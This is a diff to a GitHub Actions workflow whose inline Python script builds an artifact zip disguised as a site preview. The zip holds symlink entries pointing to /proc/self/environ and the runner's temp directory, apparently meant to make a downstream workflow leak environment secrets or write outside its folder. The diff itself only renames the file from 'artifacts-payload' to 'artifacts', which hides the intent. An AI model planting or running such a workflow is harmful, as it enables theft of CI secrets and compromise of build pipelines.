@@ -13,15 +13,15 @@ jobs:
         run: |
           python3 - <<'PY'
           import zipfile
-          z = zipfile.ZipFile('/tmp/artifacts-payload', 'w')
+          z = zipfile.ZipFile('/tmp/artifacts', 'w')
           zi = zipfile.ZipInfo('website-metadata.txt'); zi.external_attr = (0o120777) << 16
           z.writestr(zi, '/proc/self/environ')
           z.writestr('site/index.html', '<html>preview</html>\n')
           zi = zipfile.ZipInfo('site/tempdir'); zi.external_attr = (0o120777) << 16
           z.writestr(zi, '/home/runner/work/_temp')
           z.close()
-          print(open('/tmp/artifacts-payload','rb').read()[:16])
+          print(open('/tmp/artifacts','rb').read()[:16])
       - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
         with:
-          path: /tmp/artifacts-payload
+          path: /tmp/artifacts
           archive: false
